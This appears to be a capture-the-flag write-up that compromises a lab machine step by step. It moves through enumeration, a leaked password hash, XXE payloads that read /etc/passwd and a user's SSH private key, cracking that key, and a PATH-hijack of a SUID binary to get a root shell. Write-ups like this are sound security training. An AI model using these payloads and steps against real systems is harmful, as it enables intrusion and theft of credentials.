## Target IP: `10.10.101.253`
---

## Initial Enumeration

### Export Environment Variables

```bash
export IP=10.10.101.253
export LIP=10.6.24.56
```

### Nmap Scan

```bash
sudo nmap -sC -sV -T4 -O $IP -oN nmap_scan.txt
```

### Open Ports

| Port | Service | Version |
| --- | --- | --- |
| 22 | SSH | OpenSSH 7.2p2 |
| 80 | HTTP | Apache 2.4.18 |
| 8765 | HTTP | Ultraseek HTTP |

---

## Web Enumeration (Port 80)

### Home Page

- Mustache grooming site.
- Has a **contact form**.
- Nothing obvious in source code.

### Directory Busting

Found:

- `/custom`
- `/images` → contains images
- `/robots.txt` → nothing of interest

Inside `/custom/js/` → `users.bak` (SQLite file)

```bash
file users.bak         # Confirms it's SQLite
sqlite3 users.bak      # Opens it
```

Credentials found inside:

```bash
Username: admin
Hash: 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

Use CrackStation → Password: `[REDACTED]`

---

## Port 8765 - Ultraseek HTTP (Admin Panel)

### Admin Login

Navigate to:

```
http://10.10.101.253:8765
```

Login:

```
admin:[REDACTED]
```

This gives a “Submit a comment” form.

Intercepted POST request shows:

```
document.cookie = "Example=/auth/dontforget.bak";
<!-- Barry, you can now SSH in using your key! -->
```

Download the `.bak` file:

```bash
wget http://10.10.101.253/auth/dontforget.bak
```

Looks useless, but it was a hint.

---

## Exploiting XXE (XML External Entity Injection)

The web app takes XML input, so the first step is testing whether it processes the XML as expected:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <author>hacc</author>
    <name>Hackerman</name>
</roo
```

This confirms basic XML parsing works. But the real goal is to see if we can abuse the XML parser—specifically, if it lets us define external entities that point to local files on the server.

This type of attack is called **XXE (XML External Entity Injection)**. It happens when an XML parser is misconfigured and allows us to define external entities, usually to access local files or do other malicious things.

To test for XXE, we inject an external entity that tries to read `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE author [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root><author>&read;</author></root>
```

Here’s what’s happening:

- `<!DOCTYPE author [...]>` defines a new XML document type.
- `<!ENTITY read SYSTEM 'file:///etc/passwd'>` creates an entity named `read` that pulls in the contents of `/etc/passwd`.
- `<author>&read;</author>` uses that entity in the XML body.

If the app reflects back or stores the XML and we see the contents of `/etc/passwd` in the response, we know XXE is working.

### Dumping Private Key via XXE

Once we confirm that, we use the same approach to read more sensitive files—like a user’s SSH key:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE author [<!ENTITY read SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
<root><author>&read;</author></root>
```

This pulls Barry's private key if permissions allow it. From there, we can try to crack the key if it’s encrypted, or log in directly if it’s not.

---

## Cracking RSA Key

Save key as `rsa_id.pem`. Then crack it:

```bash
ssh2john rsa_id.pem > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Passphrase: `[REDACTED]`

---

## SSH as Barry

```bash
chmod 600 rsa_id.pem
ssh -i rsa_id.pem barry@$IP
```

---

## User Flag

```bash
cat user.txt
# → [REDACTED]
```

---

## Privilege Escalation via PATH Hijack + SUID

```bash
sudo -l
# → (ALL, !root) NOPASSWD: /home/joe/live_log
```

### What’s going on?

- `live_log` is **SUID**, meaning it runs as its owner (probably root).
- It executes `tail` inside the binary.
- Since binaries search for `tail` using the PATH variable **in order**, we can hijack it by placing our own fake `tail` script earlier in the PATH.

### Why this works

- SUID makes the binary run as root.
- The binary uses `tail -f /var/log/nginx/access.log`.
- If we redefine `tail` to launch a shell, the binary (running as root) will execute our malicious script.

---

### Full Exploit Steps

1. Create a script:

```bash
cd /tmp
nano tail
```

Contents:

```bash
#!/usr/bin/python3
import pty
pty.spawn("/bin/bash")
```

1. Make it executable:

```bash
chmod +x tail
```

1. Hijack the PATH:

```bash
export PATH=/tmp:$PATH
```

1. Execute SUID binary:

```bash
/home/joe/live_log
```

You're now root.

---

## Root Flag

```bash
cd /root
cat root.txt
# → [REDACTED]
```
